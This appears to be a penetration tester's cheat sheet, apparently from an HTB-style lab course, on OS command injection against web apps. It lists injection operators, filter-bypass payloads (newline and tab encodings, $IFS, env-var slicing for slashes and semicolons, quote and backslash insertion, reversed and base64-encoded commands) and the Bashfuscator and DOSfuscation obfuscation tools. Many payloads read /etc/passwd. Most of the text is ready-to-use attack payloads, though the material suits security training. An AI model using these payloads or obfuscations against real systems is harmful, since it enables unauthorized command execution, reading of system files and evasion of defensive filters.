# Command Injection

---

## Detection

Find any input that looks like it feeds into an OS command — ping fields, DNS lookup tools, host checkers, file converters, anything that appears to run something on the backend. Send a valid input first to see the expected output, then try appending injection operators. If the output changes, you're in. The app may also show error messages that reveal what's happening on the backend — verbose errors are gold.

Injection operators and how they behave:

```
;       both commands run
\n      both commands run (URL: %0a)
&       both run, second output usually shows first (URL: %26)
|       both run, only second output shown (URL: %7c)
&&      both run only if first succeeds (URL: %26%26)
||      second runs only if first fails (URL: %7c%7c)
``      subshell, Linux only
$()     subshell, Linux only
```

Start with `;` — `127.0.0.1; whoami`. If blocked, move to `%0a`. Always URL-encode in Burp when sending through the request body.

---

## Bypassing Front-End Validation

Page shows an error but no network request fires — JS is validating before anything hits the server. Intercept a valid request in Burp, forward it to Repeater, and manually append your injection payload directly in the request. The backend never sees the frontend check. `CTRL+U` in Burp to URL-encode your payload after writing it out.

---

## Identifying What's Filtered

Trim your payload down to one piece at a time. Start with just the IP — works. Add `;` alone — blocked? Then semicolons are blacklisted. Add a space — blocked? Spaces are blacklisted too. Go character by character until you know exactly which ones trigger the filter. This tells you what you need to bypass before you touch command obfuscation.

---

## Bypassing Blacklisted Operators

Most operators get caught — `;`, `&&`, `||`, `|`. But the newline character `%0a` is almost never blacklisted because apps legitimately need it in output. Try `127.0.0.1%0awhoami` — if the space is also filtered you'll need to address that separately, but the newline itself usually slips through.

---

## Bypassing Blacklisted Spaces

Tab works anywhere a space does on both Linux and Windows:

```
127.0.0.1%0a%09whoami
```

`$IFS` in bash expands to a space+tab — use it between command arguments:

```
127.0.0.1%0a${IFS}whoami
```

Brace expansion adds spaces automatically — wrap command and args in braces with commas:

```
{ls,-la}
127.0.0.1%0a{ls,-la}
```

PayloadsAllTheThings has a dedicated page on writing commands without spaces — worth checking when the above fail: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space

---

## Bypassing Blacklisted Characters (Slash, Semicolon, etc.)

When `/` is blacklisted you can't specify paths directly. Pull it from environment variables by slicing strings:

```bash
echo ${PATH:0:1}    # → /
echo ${HOME:0:1}    # → /
```

So `cat /etc/passwd` becomes `cat${IFS}${PATH:0:1}etc${PATH:0:1}passwd`

For semicolons, find one hiding in an env var:

```bash
printenv              # dump all env vars
echo ${LS_COLORS:10:1}  # → ;
```

Use that in place of `;` as your injection operator. Run `printenv` locally on a Linux box and scan for the character you need, then slice it out.

On Windows CMD:

```cmd
echo %HOMEPATH:~6,-11%    # → \
```

On PowerShell:

```powershell
$env:HOMEPATH[0]    # → \
```

Character shifting — find the ASCII value of the character you need, take the one before it, use `tr` to shift it up by one:

```bash
man ascii             # find \ at 92, [ is at 91
echo $(tr '!-}' '"-~'<<<[)   # → \
```

---

## Bypassing Blacklisted Commands

**Quote insertion** — bash ignores single and double quotes inside a command name, works on both Linux and Windows:

```bash
w'h'o'am'i
w"h"o"am"i
```

Rules: can't mix quote types, count must be even.

**Backslash insertion** (Linux only) — bash ignores backslashes between characters:

```bash
w\ho\am\i
```

**`$@` positional parameter** (Linux only):

```bash
who$@ami
```

**Windows caret**:

```cmd
who^ami
```

**Case manipulation** — on Windows CMD and PowerShell, commands are case-insensitive so `WHOAMI` or `WhOaMi` both work. On Linux it's case-sensitive, but you can force lowercase at runtime:

```bash
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
```

Make sure you replace the space in the above with `%09` or `${IFS}` if spaces are also filtered.

**Reverse commands** — reverse the string so it never appears in the payload, execute it through `rev` in a subshell:

```bash
echo 'whoami' | rev       # → imaohw
$(rev<<<'imaohw')         # executes whoami
```

On PowerShell:

```powershell
"whoami"[-1..-20] -join ''                           # → imaohw
iex "$('imaohw'[-1..-20] -join '')"                 # executes
```

**Base64 encoding** — encode the full command including any filtered chars, decode and execute in a subshell:

```bash
echo -n 'cat /etc/passwd | grep 33' | base64
# Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==

bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```

Use `<<<` instead of pipe `|` if pipes are filtered. If `bash` is blacklisted, try `sh`. If `base64` is blacklisted, try `openssl enc -d -base64` or `xxd -r -p` for hex. Replace spaces in the payload with `%09` before sending.

For Windows — encode to UTF-16LE base64 (PowerShell uses UTF-16):

```bash
# From Linux to generate Windows-compatible b64
echo -n whoami | iconv -f utf-8 -t utf-16le | base64
# → dwBoAG8AYQBtAGkA
```

```powershell
# On Windows to generate
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))

# Execute
iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
```

---

## Evasion Tools

**Bashfuscator** (Linux) — automates bash obfuscation, generates payloads that look nothing like the original command:

```bash
git clone https://github.com/Bashfuscator/Bashfuscator
cd Bashfuscator
pip3 install setuptools==65
python3 setup.py install --user

cd ./bashfuscator/bin/
./bashfuscator -c 'cat /etc/passwd'

# Shorter, more usable payload
./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
```

Test output before sending:

```bash
bash -c '<obfuscated_payload_here>'
```

**DOSfuscation** (Windows) — interactive PowerShell tool:

```powershell
git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
cd Invoke-DOSfuscation
Import-Module .\Invoke-DOSfuscation.psd1
Invoke-DOSfuscation

# Inside the tool
SET COMMAND type C:\Users\htb-student\Desktop\flag.txt
encoding
1
```

Outputs a mangled CMD command using environment variable slicing that still executes correctly. Can also run from Linux via `pwsh` if you don't have a Windows box.

---

## Combining Bypasses

When you hit multiple filters at once, stack the techniques. Space filtered AND command blacklisted? Combine tab bypass with quote insertion:

```
127.0.0.1%0a%09w'h'o'am'i
```

Slash filtered AND command filtered AND space filtered? Use env var for slash, reverse command for the word, and tab for space:

```
127.0.0.1%0a$(rev<<<'tac')%09${PATH:0:1}etc${PATH:0:1}passwd
```

Build it up one piece at a time. Identify each filtered element, pick a bypass for it, then combine them all into one final payload.

---

## Resources

PayloadsAllTheThings command injection — https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection

Writing commands without spaces — https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space

Bashfuscator — https://github.com/Bashfuscator/Bashfuscator

DOSfuscation — https://github.com/danielbohannon/Invoke-DOSfuscation